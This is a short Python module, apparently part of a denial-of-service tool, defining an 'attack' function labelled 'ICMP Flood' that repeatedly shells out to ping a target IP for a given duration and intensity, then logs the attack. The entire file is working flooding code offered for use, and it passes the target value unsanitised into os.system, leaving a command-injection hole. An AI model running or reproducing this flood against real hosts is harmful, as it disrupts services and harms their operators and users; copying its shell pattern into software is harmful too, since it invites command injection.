import os
import time
from app.logger import log_attack


def attack(target_ip, target_port, duration, intensity):
    start_time = time.time()
    while time.time() - start_time < duration:
        for _ in range(intensity):
            os.system(f"ping -c 1 {target_ip}")

    log_attack("ICMP Flood", target_ip, target_port, duration, intensity)

